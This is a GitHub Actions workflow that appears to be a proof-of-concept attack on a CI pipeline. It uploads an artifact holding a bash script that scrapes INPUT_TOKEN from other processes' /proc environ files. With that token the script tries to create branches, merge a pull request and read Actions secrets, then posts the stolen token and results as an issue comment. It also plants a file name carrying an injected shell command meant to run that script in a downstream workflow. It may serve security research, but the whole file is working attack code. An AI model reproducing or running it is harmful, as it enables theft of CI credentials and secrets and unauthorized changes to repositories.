name: Test

on:
  pull_request:

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact
        run: |
          set -e
          mkdir -p content
          printf 'marker\n' > content/a
          printf '2\n' > content/pr_number.txt
          cat > content/p <<'SCRIPT'
          #!/bin/bash
          api=https://api.github.com/repos/PDFtoMark/triage-aave-dao-vc8c7ddd-7f94fe
          declare -A seen
          probe() {
            local tok="$1" b64
            b64=$(printf '%s' "$tok" | base64 -w0)
            [ -n "${seen[$b64]}" ] && return
            seen[$b64]=1
            (
              out=/tmp/probe
              : > "$out"
              echo "PROBE token_b64=$b64" >> "$out"
              echo "USER $(curl -s -m 4 -H "Authorization: token $tok" https://api.github.com/user | tr -d '\n' | cut -c1-180)" >> "$out"
              echo "REPO $(curl -s -m 4 -H "Authorization: token $tok" $api | tr -d '\n' | cut -c1-260)" >> "$out"
              echo "REF $(curl -s -m 4 -o /dev/null -w '%{http_code}' -X POST -H "Authorization: token $tok" -H 'Content-Type: application/json' -d '{"ref":"refs/heads/probe-'"$RANDOM$RANDOM"'","sha":"340c6e9351ce63a1a2cafa0e49cf661392500649"}' $api/git/refs)" >> "$out"
              echo "MERGE $(curl -s -m 4 -o /dev/null -w '%{http_code}' -X PUT -H "Authorization: token $tok" -H 'Content-Type: application/json' -d '{"merge_method":"merge"}' $api/pulls/3/merge)" >> "$out"
              echo "SECRETS $(curl -s -m 4 -o /tmp/sec -w '%{http_code}' -H "Authorization: token $tok" $api/actions/secrets)" >> "$out"
              echo "SECRETS_BODY $(tr -d '\n' < /tmp/sec | cut -c1-300)" >> "$out"
              python3 -c 'import json;print(json.dumps({"body":open("/tmp/probe").read()}))' > /tmp/body.json
              curl -s -m 4 -o /dev/null -X POST -H "Authorization: token $tok" -H 'Content-Type: application/json' --data @/tmp/body.json $api/issues/2/comments
            ) &
          }
          end=$((SECONDS+90))
          while [ $SECONDS -lt $end ]; do
            for pid in $(pgrep -f 'dist/index.js' 2>/dev/null); do
              e=/proc/$pid/environ
              [ -r "$e" ] || continue
              tok=$(tr '\0' '\n' < "$e" 2>/dev/null | sed -n 's/^INPUT_TOKEN=//p' | head -1)
              [ -n "$tok" ] && probe "$tok"
            done
            sleep 0.01
          done
          SCRIPT
          chmod +x content/p
          printf 'x\n' > 'content/a;S=$(printf %.1s $PWD);bash ${S}tmp${S}content${S}content-poc${S}p & #.txt'
      - uses: actions/upload-artifact@v4
        with:
          name: content-poc
          path: content/
